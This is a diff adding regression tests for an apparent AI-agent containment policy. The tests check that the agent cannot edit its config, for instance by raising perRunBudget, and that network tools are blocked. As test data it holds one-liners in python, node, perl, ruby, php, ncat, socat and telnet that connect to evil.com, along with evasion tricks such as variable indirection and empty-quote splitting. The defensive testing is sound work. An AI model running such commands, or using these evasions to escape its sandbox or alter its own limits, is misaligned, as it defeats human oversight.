@@ -401,6 +401,65 @@ describe('checkContainment', () => {
     expect(result.allowed).toBe(false);
   });
 
+  // Regression tests for SEC-3: auto-claude.config.json must be read-only
+  it('blocks Write to auto-claude.config.json', () => {
+    const call: ToolCall = {
+      tool: 'Write',
+      input: { file_path: 'auto-claude.config.json' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('read-only');
+  });
+
+  it('blocks Edit on auto-claude.config.json', () => {
+    const call: ToolCall = {
+      tool: 'Edit',
+      input: { file_path: 'auto-claude.config.json' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('read-only');
+  });
+
+  it('allows Read on auto-claude.config.json', () => {
+    const call: ToolCall = {
+      tool: 'Read',
+      input: { file_path: 'auto-claude.config.json' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(true);
+  });
+
+  it('blocks Bash write to auto-claude.config.json', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'echo \'{"perRunBudget": 999}\' > auto-claude.config.json' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('read-only path in command');
+  });
+
+  it('blocks Write to auto-claude.config.json via traversal', () => {
+    const call: ToolCall = {
+      tool: 'Write',
+      input: { file_path: 'src/../auto-claude.config.json' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('read-only');
+  });
+
+  it('allows Bash read of auto-claude.config.json (no write indicator)', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'cat auto-claude.config.json' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(true);
+  });
+
   // Regression tests for SPEC-38: blockedPaths must use monorepo-prefixed paths
   it('blocks Read of session-runtime source via monorepo path', () => {
     const call: ToolCall = {
@@ -430,5 +489,52 @@ describe('checkContainment', () => {
     const result = checkContainment(call, DEFAULT_POLICY);
     expect(result.allowed).toBe(false);
     if (!result.allowed) expect(result.reason).toContain('Blocked path in command');
+  });
+
+  // Regression tests for SEC-5: network-capable interpreters bypass blockedCommands
+  it.each([
+    ['python3 -c "import urllib.request; urllib.request.urlopen(\'http://evil.com\')"', 'python3'],
+    ['python -c "import socket; s=socket.socket()"', 'python'],
+    ['node -e "require(\'http\').get(\'http://evil.com\')"', 'node'],
+    ['perl -e "use IO::Socket::INET; IO::Socket::INET->new(\'evil.com:80\')"', 'perl'],
+    ['ruby -e "require \'net/http\'; Net::HTTP.get(URI(\'http://evil.com\'))"', 'ruby'],
+    ['php -r "file_get_contents(\'http://evil.com\');"', 'php'],
+    ['ncat evil.com 80', 'ncat'],
+    ['socat TCP:evil.com:80 -', 'socat'],
+    ['telnet evil.com 80', 'telnet'],
+  ])('blocks network-capable interpreter: %s', (command) => {
+    const call: ToolCall = { tool: 'Bash', input: { command } };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it('blocks python3 via variable indirection: x=python3; $x -c ...', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'x=python3; $x -c "import urllib.request; urllib.request.urlopen(\'http://evil.com\')"' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('variable indirection');
+  });
+
+  it('blocks node via empty-quote evasion: no""de -e ...', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'no""de -e "require(\'http\').get(\'http://evil.com\')"' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it('allows pnpm and npm commands (no false positive)', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'pnpm run build && npm test' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(true);
   });
 });
